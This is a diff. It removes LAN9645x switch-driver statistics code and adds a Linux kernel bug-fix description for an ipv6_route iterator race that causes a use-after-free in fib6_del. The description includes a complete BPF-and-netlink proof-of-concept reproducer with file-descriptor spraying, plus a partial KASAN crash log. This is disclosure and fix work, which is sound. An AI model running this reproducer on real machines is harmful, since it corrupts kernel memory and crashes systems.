-+	stats->lan9645x = lan9645x;
-+
-+	for (int t = 0; t < LAN9645X_STAT_NUM; t++) {
-+		err = lan9645x_view_stat_init(lan9645x, &stats->view[t],
-+					      &lan9645x_view_stat_cfgs[t]);
-+		if (err)
-+			return err;
-+	}
-+
-+	stats->queue = alloc_ordered_workqueue("%s-stats", 0,
-+					       dev_name(lan9645x->dev));
-+	if (!stats->queue)
-+		return -ENOMEM;
-+
-+	mutex_init(&stats->hw_lock);
-+	spin_lock_init(&stats->sw_lock);
-+	INIT_DELAYED_WORK(&stats->work, lan9645x_check_stats_work);
-+
-+	return 0;
-+}
-+
-+void lan9645x_stats_free(struct lan9645x *lan9645x)
-+{
-+	cancel_delayed_work_sync(&lan9645x->stats->work);
-+	destroy_workqueue(lan9645x->stats->queue);
-+	mutex_destroy(&lan9645x->stats->hw_lock);
-+}
-+
-+static int lan9645x_stats_clear_view(struct lan9645x *lan9645x, u32 idx,
-+				     u32 groups)
-+{
-+	u32 val;
-+
-+	lockdep_assert_held(&lan9645x->stats->hw_lock);
-+
-+	lan_wr(SYS_STAT_CFG_STAT_VIEW_SET(idx) |
-+	       SYS_STAT_CFG_STAT_CLEAR_SHOT_SET(groups),
-+	       lan9645x, SYS_STAT_CFG);
-+
-+	/* STAT_CLEAR_SHOT self-clears when the clear completes, in about 1us.
-+	 * Wait for it, so the next STAT_VIEW write cannot land while a
-+	 * clear is still in flight.
-+	 */
-+	return lan9645x_rd_poll_timeout(lan9645x, SYS_STAT_CFG, val,
-+					!SYS_STAT_CFG_STAT_CLEAR_SHOT_GET(val));
-+}
-+
-+void lan9645x_stats_init(struct lan9645x *lan9645x)
-+{
-+	struct lan9645x_stats *stats = lan9645x->stats;
-+	struct lan9645x_view_stats *vstat;
-+
-+	 /* Make sure software and hardware is zeroed on init. */
-+	vstat = &stats->view[LAN9645X_STAT_PORTS];
-+
-+	mutex_lock(&stats->hw_lock);
-+
-+	/* Clear hardware before software. A failed clear leaves hardware
-+	 * non-zero against a zeroed shadow, which the first poll in
-+	 * lan9645x_stats_update_counter() simply adopts.
-+	 */
-+	for (u32 idx = 0; idx < vstat->num_indexes; idx++)
-+		if (lan9645x_stats_clear_view(lan9645x, idx,
-+					      LAN9645X_STAT_PORT_GROUPS))
-+			dev_err(lan9645x->dev,
-+				"Timeout clearing counters for port %u\n", idx);
-+
-+	spin_lock(&stats->sw_lock);
-+	memset(vstat->cnts, 0,
-+	       array3_size(vstat->num_indexes, vstat->num_cnts,
-+			   sizeof(*vstat->cnts)));
-+	spin_unlock(&stats->sw_lock);
-+
-+	mutex_unlock(&stats->hw_lock);
-+
-+	queue_delayed_work(stats->queue, &stats->work,
-+			   LAN9645X_STATS_CHECK_DELAY);
-+}
-+
-+void lan9645x_stats_deinit(struct lan9645x *lan9645x)
-+{
-+	cancel_delayed_work_sync(&lan9645x->stats->work);
-+}
-diff --git a/drivers/net/dsa/microchip/lan9645x/lan9645x_stats.h b/drivers/net/dsa/microchip/lan9645x/lan9645x_stats.h
-new file mode 100644
-index 000000000000..915e20af6521
---- /dev/null
-+++ b/drivers/net/dsa/microchip/lan9645x/lan9645x_stats.h
-@@ -0,0 +1,229 @@
-+/* SPDX-License-Identifier: GPL-2.0+ */
-+/* Copyright (C) 2026 Microchip Technology Inc.
-+ */
-+
-+#ifndef _LAN9645X_STATS_H_
-+#define _LAN9645X_STATS_H_
-+
-+#include <linux/ethtool.h>
-+#include <linux/mutex.h>
-+#include <linux/spinlock.h>
-+#include <linux/types.h>
-+#include <linux/workqueue.h>
-+
-+#include "lan9645x_main.h"
-+
-+/* Counter indices into stat layout structs */
-+#define SCNT_RX_OCT                      0
-+#define SCNT_RX_UC                       1
-+#define SCNT_RX_MC                       2
-+#define SCNT_RX_BC                       3
-+#define SCNT_RX_SHORT                    4
-+#define SCNT_RX_FRAG                     5
-+#define SCNT_RX_JABBER                   6
-+#define SCNT_RX_CRC                      7
-+#define SCNT_RX_SYMBOL_ERR               8
-+#define SCNT_RX_SZ_64                    9
-+#define SCNT_RX_SZ_65_127                10
-+#define SCNT_RX_SZ_128_255               11
-+#define SCNT_RX_SZ_256_511               12
-+#define SCNT_RX_SZ_512_1023              13
-+#define SCNT_RX_SZ_1024_1526             14
-+#define SCNT_RX_SZ_JUMBO                 15
-+#define SCNT_RX_PAUSE                    16
-+#define SCNT_RX_CONTROL                  17
-+#define SCNT_RX_LONG                     18
-+#define SCNT_RX_CAT_DROP                 19
-+#define SCNT_RX_RED_PRIO_0               20
-+#define SCNT_RX_RED_PRIO_1               21
-+#define SCNT_RX_RED_PRIO_2               22
-+#define SCNT_RX_RED_PRIO_3               23
-+#define SCNT_RX_RED_PRIO_4               24
-+#define SCNT_RX_RED_PRIO_5               25
-+#define SCNT_RX_RED_PRIO_6               26
-+#define SCNT_RX_RED_PRIO_7               27
-+#define SCNT_RX_YELLOW_PRIO_0            28
-+#define SCNT_RX_YELLOW_PRIO_1            29
-+#define SCNT_RX_YELLOW_PRIO_2            30
-+#define SCNT_RX_YELLOW_PRIO_3            31
-+#define SCNT_RX_YELLOW_PRIO_4            32
-+#define SCNT_RX_YELLOW_PRIO_5            33
-+#define SCNT_RX_YELLOW_PRIO_6            34
-+#define SCNT_RX_YELLOW_PRIO_7            35
-+#define SCNT_RX_GREEN_PRIO_0             36
-+#define SCNT_RX_GREEN_PRIO_1             37
-+#define SCNT_RX_GREEN_PRIO_2             38
-+#define SCNT_RX_GREEN_PRIO_3             39
-+#define SCNT_RX_GREEN_PRIO_4             40
-+#define SCNT_RX_GREEN_PRIO_5             41
-+#define SCNT_RX_GREEN_PRIO_6             42
-+#define SCNT_RX_GREEN_PRIO_7             43
-+#define SCNT_RX_ASSEMBLY_ERR             44
-+#define SCNT_RX_SMD_ERR                  45
-+#define SCNT_RX_ASSEMBLY_OK              46
-+#define SCNT_RX_MERGE_FRAG               47
-+#define SCNT_RX_PMAC_OCT                 48
-+#define SCNT_RX_PMAC_UC                  49
-+#define SCNT_RX_PMAC_MC                  50
-+#define SCNT_RX_PMAC_BC                  51
-+#define SCNT_RX_PMAC_SHORT               52
-+#define SCNT_RX_PMAC_FRAG                53
-+#define SCNT_RX_PMAC_JABBER              54
-+#define SCNT_RX_PMAC_CRC                 55
-+#define SCNT_RX_PMAC_SYMBOL_ERR          56
-+#define SCNT_RX_PMAC_SZ_64               57
-+#define SCNT_RX_PMAC_SZ_65_127           58
-+#define SCNT_RX_PMAC_SZ_128_255          59
-+#define SCNT_RX_PMAC_SZ_256_511          60
-+#define SCNT_RX_PMAC_SZ_512_1023         61
-+#define SCNT_RX_PMAC_SZ_1024_1526        62
-+#define SCNT_RX_PMAC_SZ_JUMBO            63
-+#define SCNT_RX_PMAC_PAUSE               64
-+#define SCNT_RX_PMAC_CONTROL             65
-+#define SCNT_RX_PMAC_LONG                66
-+#define SCNT_TX_OCT                      67
-+#define SCNT_TX_UC                       68
-+#define SCNT_TX_MC                       69
-+#define SCNT_TX_BC                       70
-+#define SCNT_TX_COL                      71
-+#define SCNT_TX_DROP                     72
-+#define SCNT_TX_PAUSE                    73
-+#define SCNT_TX_SZ_64                    74
-+#define SCNT_TX_SZ_65_127                75
-+#define SCNT_TX_SZ_128_255               76
-+#define SCNT_TX_SZ_256_511               77
-+#define SCNT_TX_SZ_512_1023              78
-+#define SCNT_TX_SZ_1024_1526             79
-+#define SCNT_TX_SZ_JUMBO                 80
-+#define SCNT_TX_YELLOW_PRIO_0            81
-+#define SCNT_TX_YELLOW_PRIO_1            82
-+#define SCNT_TX_YELLOW_PRIO_2            83
-+#define SCNT_TX_YELLOW_PRIO_3            84
-+#define SCNT_TX_YELLOW_PRIO_4            85
-+#define SCNT_TX_YELLOW_PRIO_5            86
-+#define SCNT_TX_YELLOW_PRIO_6            87
-+#define SCNT_TX_YELLOW_PRIO_7            88
-+#define SCNT_TX_GREEN_PRIO_0             89
-+#define SCNT_TX_GREEN_PRIO_1             90
-+#define SCNT_TX_GREEN_PRIO_2             91
-+#define SCNT_TX_GREEN_PRIO_3             92
-+#define SCNT_TX_GREEN_PRIO_4             93
-+#define SCNT_TX_GREEN_PRIO_5             94
-+#define SCNT_TX_GREEN_PRIO_6             95
-+#define SCNT_TX_GREEN_PRIO_7             96
-+#define SCNT_TX_AGED                     97
-+#define SCNT_TX_LLCT                     98
-+#define SCNT_TX_CT                       99
-+#define SCNT_TX_BUFDROP                  100
-+#define SCNT_TX_MM_HOLD                  101
-+#define SCNT_TX_MERGE_FRAG               102
-+#define SCNT_TX_PMAC_OCT                 103
-+#define SCNT_TX_PMAC_UC                  104
-+#define SCNT_TX_PMAC_MC                  105
-+#define SCNT_TX_PMAC_BC                  106
-+#define SCNT_TX_PMAC_PAUSE               107
-+#define SCNT_TX_PMAC_SZ_64               108
-+#define SCNT_TX_PMAC_SZ_65_127           109
-+#define SCNT_TX_PMAC_SZ_128_255          110
-+#define SCNT_TX_PMAC_SZ_256_511          111
-+#define SCNT_TX_PMAC_SZ_512_1023         112
-+#define SCNT_TX_PMAC_SZ_1024_1526        113
-+#define SCNT_TX_PMAC_SZ_JUMBO            114
-+#define SCNT_DR_LOCAL                    115
-+#define SCNT_DR_TAIL                     116
-+#define SCNT_DR_YELLOW_PRIO_0            117
-+#define SCNT_DR_YELLOW_PRIO_1            118
-+#define SCNT_DR_YELLOW_PRIO_2            119
-+#define SCNT_DR_YELLOW_PRIO_3            120
-+#define SCNT_DR_YELLOW_PRIO_4            121
-+#define SCNT_DR_YELLOW_PRIO_5            122
-+#define SCNT_DR_YELLOW_PRIO_6            123
-+#define SCNT_DR_YELLOW_PRIO_7            124
-+#define SCNT_DR_GREEN_PRIO_0             125
-+#define SCNT_DR_GREEN_PRIO_1             126
-+#define SCNT_DR_GREEN_PRIO_2             127
-+#define SCNT_DR_GREEN_PRIO_3             128
-+#define SCNT_DR_GREEN_PRIO_4             129
-+#define SCNT_DR_GREEN_PRIO_5             130
-+#define SCNT_DR_GREEN_PRIO_6             131
-+#define SCNT_DR_GREEN_PRIO_7             132
-+
-+enum lan9645x_view_stat_type {
-+	LAN9645X_STAT_PORTS = 0,
-+	/* Unimplemented views: ISDX, ESDX, SFID, FRER */
-+
-+	LAN9645X_STAT_NUM,
-+};
-+
-+struct lan9645x_stat_region {
-+	u32 base_offset;
-+	u32 cnt;
-+	u32 cnts_base_idx;
-+};
-+
-+/* Counters are organized by indices/views such as
-+ *
-+ * - physical ports
-+ * - isdx
-+ * - esdx
-+ * - frer
-+ * - sfid
-+ *
-+ * Each view contains regions, which is a linear address range of related
-+ * stats. I.e. the ports index has RX, TX and Drop regions, and you have a
-+ * given counter replicated per index.
-+ */
-+struct lan9645x_view_stats {
-+	/* HW register offsets indexed by SCNT_*, used for bulk reading */
-+	const u32 *layout;
-+	/* Region description for this view, used for bulk reading */
-+	struct lan9645x_stat_region *regions;
-+	/* 64bit software counters with the same addr layout hw */
-+	u64 *cnts;
-+	/* Buffer for bulk reading counter regions from hw */
-+	u32 *buf;
-+	/* Number of counters per index in view */
-+	u32 num_cnts;
-+	/* Number of indexes in view */
-+	u32 num_indexes;
-+	/* Number of counter regions with counters at sequential addresses */
-+	size_t num_regions;
-+};
-+
-+struct lan9645x_stats {
-+	struct lan9645x *lan9645x;
-+	struct mutex hw_lock; /* lock r/w to stat registers and u32 buf */
-+	spinlock_t sw_lock; /* lock access to u64 software counters */
-+	struct delayed_work work;
-+	struct workqueue_struct *queue;
-+
-+	struct lan9645x_view_stats view[LAN9645X_STAT_NUM];
-+};
-+
-+int lan9645x_stats_alloc(struct lan9645x *lan9645x);
-+void lan9645x_stats_free(struct lan9645x *lan9645x);
-+void lan9645x_stats_init(struct lan9645x *lan9645x);
-+void lan9645x_stats_deinit(struct lan9645x *lan9645x);
-+void lan9645x_stats_get_strings(struct lan9645x *lan9645x, int port,
-+				u32 stringset, u8 *data);
-+int lan9645x_stats_get_sset_count(struct lan9645x *lan9645x, int port,
-+				  int sset);
-+void lan9645x_stats_get_ethtool_stats(struct lan9645x *lan9645x, int port,
-+				      u64 *data);
-+void lan9645x_stats_get_eth_mac_stats(struct lan9645x *lan9645x, int port,
-+				      struct ethtool_eth_mac_stats *mac_stats);
-+void
-+lan9645x_stats_get_rmon_stats(struct lan9645x *lan9645x, int port,
-+			      struct ethtool_rmon_stats *rmon_stats,
-+			      const struct ethtool_rmon_hist_range **ranges);
-+void lan9645x_stats_get_stats64(struct lan9645x *lan9645x, int port,
-+				struct rtnl_link_stats64 *s);
-+void lan9645x_stats_get_pause_stats(struct lan9645x *lan9645x, int port,
-+				    struct ethtool_pause_stats *ps);
-+void
-+lan9645x_stats_get_eth_ctrl_stats(struct lan9645x *lan9645x, int port,
-+				  struct ethtool_eth_ctrl_stats *ctrl_stats);
-+void lan9645x_stats_get_eth_phy_stats(struct lan9645x *lan9645x, int port,
-+				      struct ethtool_eth_phy_stats *phy_stats);
-+
-+#endif
+The root-cause fact is this false "already unlinked" inference in the
+seq iterator. It was introduced by 8d2ca1d7b5c3 ("ipv6: avoid high
+order memory allocations for /proc/net/ipv6_route"). fib6_del_route()
+already set FWS_U without unlinking before that commit. The later BPF
+iterator only widened the trigger window, so Fixes: still points at
+8d2ca1d7b5c3.
+
+The fix uses the list head as membership state and reinitializes it
+in fib6_walker_unlink(). seq stop can then unlink a terminal walker
+that route deletion left linked, while a completed walker that was
+already unlinked stays unlinked.
+
+packetdrill is not used because the trigger is an ipv6_route seq
+iterator racing RTM_DELROUTE, not a packet sequence. The attached
+reproducer is Makefile, poc.bpf.c, and poc.c. poc.c links libbpf,
+so it is built with make rather than a single gcc -static line.
+The reliable crash we hit used the BPF iterator as root.
+
+Reproducer:
+
+    make
+    ./poc ./poc.bpf.o
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN Makefile------
+CLANG ?= clang
+CC ?= gcc
+KDIR ?= /path/to/kernel
+LIBBPF_INCLUDE ?= $(KDIR)/build/tools/bpf/resolve_btfids/libbpf/include
+
+BPF_CFLAGS := -g -O2 -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra \
+	-I/usr/include/x86_64-linux-gnu \
+	-I$(LIBBPF_INCLUDE)
+USER_CFLAGS := -g -O2 -Wall -Wextra -I/usr/include/x86_64-linux-gnu \
+	-I$(LIBBPF_INCLUDE)
+USER_LDLIBS := -L/lib/x86_64-linux-gnu -Wl,-rpath,/lib/x86_64-linux-gnu \
+	-l:libbpf.so.1 -lelf -lz
+
+all: poc.bpf.o poc
+
+poc.bpf.o: poc.bpf.c
+	$(CLANG) $(BPF_CFLAGS) -c $< -o $@
+
+poc: poc.c
+	$(CC) $(USER_CFLAGS) $< -o $@ $(USER_LDLIBS)
+
+clean:
+	rm -f poc poc.bpf.o
+------END Makefile--------
+
+------BEGIN poc.bpf.c------
+// SPDX-License-Identifier: GPL-2.0
+#include <linux/bpf.h>
+#include <linux/in6.h>
+#include <linux/types.h>
+#include <bpf/bpf_core_read.h>
+#include <bpf/bpf_helpers.h>
+
+struct seq_file;
+
+struct bpf_iter_meta {
+	struct seq_file *seq;
+} __attribute__((preserve_access_index));
+
+struct fib6_table {
+	__u32 tb6_id;
+} __attribute__((preserve_access_index));
+
+struct rt6key {
+	struct in6_addr addr;
+	int plen;
+} __attribute__((preserve_access_index));
+
+struct fib6_info {
+	struct fib6_table *fib6_table;
+	struct rt6key fib6_dst;
+	__u32 fib6_metric;
+} __attribute__((preserve_access_index));
+
+struct bpf_iter__ipv6_route {
+	struct bpf_iter_meta *meta;
+	struct fib6_info *rt;
+} __attribute__((preserve_access_index));
+
+struct ctrl_state {
+	__u32 seen;
+	__u32 deleted;
+	__u32 done;
+	__u32 hits;
+	__u32 target_table;
+	__u32 target_metric;
+};
+
+struct {
+	__uint(type, BPF_MAP_TYPE_ARRAY);
+	__uint(max_entries, 1);
+	__type(key, __u32);
+	__type(value, struct ctrl_state);
+} ctrl_map SEC(".maps");
+
+SEC("iter/ipv6_route")
+int trigger(struct bpf_iter__ipv6_route *ctx)
+{
+	__u32 key = 0;
+	struct ctrl_state *st;
+	struct fib6_info *rt;
+	struct rt6key dst;
+	__u64 chunk = 0x4141414141414141ULL;
+	int i;
+
+	if (!ctx || !ctx->meta || !ctx->meta->seq)
+		return 0;
+
+	rt = ctx->rt;
+	if (!rt)
+		return 0;
+
+	st = bpf_map_lookup_elem(&ctrl_map, &key);
+	if (!st)
+		return 0;
+
+	if (BPF_CORE_READ(rt, fib6_table, tb6_id) != st->target_table)
+		return 0;
+	if (BPF_CORE_READ(rt, fib6_metric) != st->target_metric)
+		return 0;
+	dst = BPF_CORE_READ(rt, fib6_dst);
+	if (dst.plen != 0)
+		return 0;
+
+	st->hits++;
+	st->seen = 1;
+
+#pragma clang loop unroll(disable)
+	for (i = 0; i < 4096; i++)
+		bpf_seq_write(ctx->meta->seq, &chunk, sizeof(chunk));
+
+	st->done = 1;
+	return 0;
+}
+
+char LICENSE[] SEC("license") = "GPL";
+------END poc.bpf.c--------
+
+------BEGIN poc.c------
+// SPDX-License-Identifier: GPL-2.0
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+#include <net/if.h>
+#include <pthread.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#include <bpf/bpf.h>
+#include <bpf/libbpf.h>
+
+#define TARGET_TABLE 1234
+#define TARGET_METRIC 4242
+#define TRIGGER_TABLE 1235
+#define TRIGGER_METRIC 4343
+#define SPRAY_FDS 512
+#define DEFAULT_ATTEMPTS 10000
+
+struct ctrl_state {
+	uint32_t seen;
+	uint32_t deleted;
+	uint32_t done;
+	uint32_t hits;
+	uint32_t target_table;
+	uint32_t target_metric;
+};
+
+struct reader_args {
+	int fd;
+	ssize_t ret;
+	int err;
+};
+
+static int libbpf_log(enum libbpf_print_level level, const char *fmt, va_list ap)
+{
+	if (level == LIBBPF_DEBUG)
+		return 0;
+	return vfprintf(stderr, fmt, ap);
+}
+
+static void die(const char *msg)
+{
+	perror(msg);
+	exit(EXIT_FAILURE);
+}
+
+static void addattr_l(struct nlmsghdr *nlh, size_t maxlen, int type,
+		      const void *data, size_t alen)
+{
+	size_t len = RTA_LENGTH(alen);
+	struct rtattr *rta;
+
+	if (NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
+		fprintf(stderr, "netlink attribute overflow\n");
+		exit(EXIT_FAILURE);
+	}
+
+	rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
+	rta->rta_type = type;
+	rta->rta_len = len;
+	if (alen)
+		memcpy(RTA_DATA(rta), data, alen);
+	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
+}
+
+static int nl_talk(int fd, struct nlmsghdr *nlh)
+{
+	struct sockaddr_nl sa = {
+		.nl_family = AF_NETLINK,
+	};
+	struct iovec iov = {
+		.iov_base = nlh,
+		.iov_len = nlh->nlmsg_len,
+	};
+	struct msghdr msg = {
+		.msg_name = &sa,
+		.msg_namelen = sizeof(sa),
+		.msg_iov = &iov,
+		.msg_iovlen = 1,
+	};
+	char buf[4096];
+	struct nlmsghdr *reply;
+	ssize_t len;
+
+	if (sendmsg(fd, &msg, 0) < 0)
+		return -errno;
+
+	for (;;) {
+		len = recv(fd, buf, sizeof(buf), 0);
+		if (len < 0) {
+			if (errno == EINTR)
+				continue;
+			return -errno;
+		}
+
+		for (reply = (struct nlmsghdr *)buf; NLMSG_OK(reply, (unsigned int)len);
+		     reply = NLMSG_NEXT(reply, len)) {
+			if (reply->nlmsg_type == NLMSG_ERROR) {
+				struct nlmsgerr *err = NLMSG_DATA(reply);
+
+				if (reply->nlmsg_len < NLMSG_LENGTH(sizeof(*err)))
+					return -EIO;
+				return err->error;
+			}
+		}
+	}
+}
+
+static int change_default_route(int fd, int cmd, uint32_t table, uint32_t metric,
+				int ifindex)
+{
+	struct {
+		struct nlmsghdr nlh;
+		struct rtmsg rtm;
+		char buf[256];
+	} req = {
+		.nlh = {
+			.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)),
+			.nlmsg_type = cmd,
+			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
+		},
+		.rtm = {
+			.rtm_family = AF_INET6,
+			.rtm_table = RT_TABLE_UNSPEC,
+			.rtm_protocol = RTPROT_BOOT,
+			.rtm_scope = RT_SCOPE_UNIVERSE,
+			.rtm_type = RTN_UNICAST,
+		},
+	};
+	int ret;
+
+	if (cmd == RTM_NEWROUTE)
+		req.nlh.nlmsg_flags |= NLM_F_CREATE | NLM_F_EXCL;
+
+	addattr_l(&req.nlh, sizeof(req), RTA_TABLE, &table, sizeof(table));
+	addattr_l(&req.nlh, sizeof(req), RTA_PRIORITY, &metric, sizeof(metric));
+	addattr_l(&req.nlh, sizeof(req), RTA_OIF, &ifindex, sizeof(ifindex));
+
+	ret = nl_talk(fd, &req.nlh);
+	return ret;
+}
+
+static void cleanup_routes(int fd, int ifindex)
+{
+	(void)change_default_route(fd, RTM_DELROUTE, TARGET_TABLE, TARGET_METRIC, ifindex);
+	(void)change_default_route(fd, RTM_DELROUTE, TRIGGER_TABLE, TRIGGER_METRIC, ifindex);
+}
+
+static void *reader_thread(void *arg)
+{
+	struct reader_args *reader = arg;
+	char buf[64];
+
+	errno = 0;
+	reader->ret = read(reader->fd, buf, sizeof(buf));
+	reader->err = errno;
+	close(reader->fd);
+	reader->fd = -1;
+	return NULL;
+}
+
+static int update_state(int map_fd, const struct ctrl_state *state)
+{
+	uint32_t key = 0;
+
+	return bpf_map_update_elem(map_fd, &key, state, BPF_ANY);
+}
+
+static int lookup_state(int map_fd, struct ctrl_state *state)
+{
+	uint32_t key = 0;
+
+	return bpf_map_lookup_elem(map_fd, &key, state);
+}
+
+static int wait_until_seen(int map_fd, struct ctrl_state *state)
+{
+	int spins;
+
+	for (spins = 0; spins < 1000000; spins++) {
+		if (lookup_state(map_fd, state))
+			return -1;
+		if (state->seen)
+			return 0;
+	}
+	return -1;
+}
+
+int main(int argc, char **argv)
+{
+	const char *obj_path = "./poc.bpf.o";
+	struct bpf_object *obj = NULL;
+	struct bpf_program *prog;
+	struct bpf_link *link = NULL;
+	struct bpf_map *map;
+	struct rlimit rlim = {
+		.rlim_cur = RLIM_INFINITY,
+		.rlim_max = RLIM_INFINITY,
+	};
+	int route_fd = -1;
+	int map_fd;
+	int link_fd;
+	int ifindex;
+	int attempts = DEFAULT_ATTEMPTS;
+	int attempt;
+	int err;
+
+	if (argc > 1)
+		obj_path = argv[1];
+	if (argc > 2)
+		attempts = atoi(argv[2]);
+
+	libbpf_set_print(libbpf_log);
+	libbpf_set_strict_mode(LIBBPF_STRICT_ALL);
+
+	if (setrlimit(RLIMIT_MEMLOCK, &rlim) && errno != EPERM)
+		die("setrlimit");
+
+	obj = bpf_object__open_file(obj_path, NULL);
+	if (!obj) {
+		fprintf(stderr, "failed to open %s\n", obj_path);
+		return EXIT_FAILURE;
+	}
+
+	err = bpf_object__load(obj);
+	if (err) {
+		fprintf(stderr, "failed to load BPF object: %d\n", err);
+		goto out;
+	}
+
+	prog = bpf_object__find_program_by_name(obj, "trigger");
+	if (!prog) {
+		fprintf(stderr, "failed to find BPF program\n");
+		goto out;
+	}
+
+	map = bpf_object__find_map_by_name(obj, "ctrl_map");
+	if (!map) {
+		fprintf(stderr, "failed to find ctrl_map\n");
+		goto out;
+	}
+	map_fd = bpf_map__fd(map);
+
+	link = bpf_program__attach_iter(prog, NULL);
+	if (!link) {
+		err = -errno;
+		fprintf(stderr, "attach_iter failed: %d\n", err);
+		goto out;
+	}
+	link_fd = bpf_link__fd(link);
+
+	route_fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
+	if (route_fd < 0)
+		die("socket(NETLINK_ROUTE)");
+
+	ifindex = if_nametoindex("lo");
+	if (!ifindex) {
+		fprintf(stderr, "failed to resolve ifindex for lo\n");
+		goto out;
+	}
+
+	printf("loaded %s, link_fd=%d, ifindex(lo)=%d, attempts=%d\n",
+	       obj_path, link_fd, ifindex, attempts);
+	fflush(stdout);
+
+	for (attempt = 1; attempt <= attempts; attempt++) {
+		struct ctrl_state state = {
+			.target_table = TARGET_TABLE,
+			.target_metric = TARGET_METRIC,
+		};
+		struct reader_args reader = {
+			.fd = -1,
+			.ret = -1,
+			.err = 0,
+		};
+		pthread_t tid;
+		int spray[SPRAY_FDS];
+		int iter_fd;
+		int i;
+		bool saw_target = false;
+
+		memset(spray, -1, sizeof(spray));
+		cleanup_routes(route_fd, ifindex);
+
+		err = change_default_route(route_fd, RTM_NEWROUTE,
+					   TRIGGER_TABLE, TRIGGER_METRIC, ifindex);
+		if (err) {
+			fprintf(stderr, "attempt %d: add trigger route failed: %s\n",
+				attempt, strerror(-err));
+			break;
+		}
+
+		err = change_default_route(route_fd, RTM_NEWROUTE,
+					   TARGET_TABLE, TARGET_METRIC, ifindex);
+		if (err) {
+			fprintf(stderr, "attempt %d: add target route failed: %s\n",
+				attempt, strerror(-err));
+			(void)change_default_route(route_fd, RTM_DELROUTE,
+						   TRIGGER_TABLE, TRIGGER_METRIC, ifindex);
+			break;
+		}
+
+		if (update_state(map_fd, &state)) {
+			perror("bpf_map_update_elem");
+			break;
+		}
+
+		iter_fd = bpf_iter_create(link_fd);
+		if (iter_fd < 0) {
+			perror("bpf_iter_create");
+			break;
+		}
+
+		reader.fd = iter_fd;
+		if (pthread_create(&tid, NULL, reader_thread, &reader)) {
+			perror("pthread_create");
+			close(iter_fd);
+			break;
+		}
+
+		if (!wait_until_seen(map_fd, &state)) {
+			saw_target = true;
+			err = change_default_route(route_fd, RTM_DELROUTE,
+						   TARGET_TABLE, TARGET_METRIC, ifindex);
+			if (err) {
+				fprintf(stderr,
+					"attempt %d: delete target route failed: %s\n",
+					attempt, strerror(-err));
+			} else {
+				state.deleted = 1;
+				if (update_state(map_fd, &state))
+					perror("bpf_map_update_elem deleted");
+			}
+		}
+
+		pthread_join(tid, NULL);
+
+		for (i = 0; i < SPRAY_FDS; i++) {
+			spray[i] = bpf_iter_create(link_fd);
+			if (spray[i] < 0)
+				break;
+		}
+
+		err = change_default_route(route_fd, RTM_DELROUTE,
+					   TRIGGER_TABLE, TRIGGER_METRIC, ifindex);
+		if (err) {
+			fprintf(stderr, "attempt %d: delete trigger route failed: %s\n",
+				attempt, strerror(-err));
+		}
+
+		for (i = 0; i < SPRAY_FDS; i++) {
+			if (spray[i] >= 0)
+				close(spray[i]);
+		}
+
+		if (attempt == 1 || !(attempt % 100)) {
+			printf("attempt=%d seen=%u deleted=%u done=%u hits=%u read_ret=%zd read_errno=%d saw_target=%d\n",
+			       attempt, state.seen, state.deleted, state.done,
+			       state.hits, reader.ret, reader.err, saw_target);
+			fflush(stdout);
+		}
+	}
+
+out:
+	cleanup_routes(route_fd, if_nametoindex("lo"));
+	if (route_fd >= 0)
+		close(route_fd);
+	if (link)
+		bpf_link__destroy(link);
+	if (obj)
+		bpf_object__close(obj);
+	return 0;
+}
+------END poc.c--------
+
+
+----BEGIN crash log----
+
+[    9.380711] BUG: KASAN: slab-use-after-free in fib6_del (net/ipv6/ip6_fib.c:2028 net/ipv6/ip6_fib.c:2096)
+[    9.380725] Read of size 4 at addr ffff88800bfe9a20 by task poc/276
+[    9.380727]
+[    9.380730] CPU: 1 UID: 0 PID: 276 Comm: poc Not tainted 7.3.0-rc1-00304-g4ff75f130d1b #2 PREEMPT(lazy)
+[    9.380733] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[    9.380735] Call Trace:
+[    9.380736]  <TASK>
+[    9.380737]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
+[    9.380742]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)
+[    9.380746]  ? __pfx__raw_spin_lock_irqsave (kernel/locking/spinlock.c:190)
+[    9.380749]  ? __pfx___nla_validate_parse (lib/nlattr.c:285)
+[    9.380753]  ? __virt_addr_valid (include/linux/mmzone.h:2131 (discriminator 1) include/linux/mmzone.h:2277 (discriminator 1) arch/x86/mm/physaddr.c:54 (discriminator 1))
+[    9.380757]  ? fib6_del (net/ipv6/ip6_fib.c:2028 net/ipv6/ip6_fib.c:2096)
+[    9.380759]  kasan_report (mm/kasan/report.c:595)
+[    9.380776]  ? fib6_del (net/ipv6/ip6_fib.c:2028 net/ipv6/ip6_fib.c:2096)
+[    9.380779]  fib6_del (net/ipv6/ip6_fib.c:2028 net/ipv6/ip6_fib.c:2096)
+[    9.380782]  ? __pfx_fib6_del (net/ipv6/ip6_fib.c:1800)
+[    9.380784]  ? _raw_spin_lock_bh (include/linux/instrumented.h:55 include/linux/atomic/atomic-instrumented.h:1301 include/asm-generic/qspinlock.h:112 include/linux/spinlock.h:188 include/linux/spinlock_api_smp.h:183 kernel/locking/spinlock.c:205)
+[    9.380787]  ? __pfx__raw_spin_lock_bh (kernel/locking/spinlock.c:174)
+[    9.380790]  ? fib6_locate (net/ipv6/ip6_fib.c:1797 (discriminator 1))
+[    9.380793]  ip6_route_del (net/ipv6/route.c:4083 net/ipv6/route.c:4232)
+[    9.380796]  ? __pfx_ip6_route_del (net/ipv6/route.c:6549)
+[    9.380799]  ? unwind_get_return_address (arch/x86/kernel/unwind_orc.c:385)
+[    9.380802]  ? arch_stack_walk (arch/x86/kernel/stacktrace.c:26)
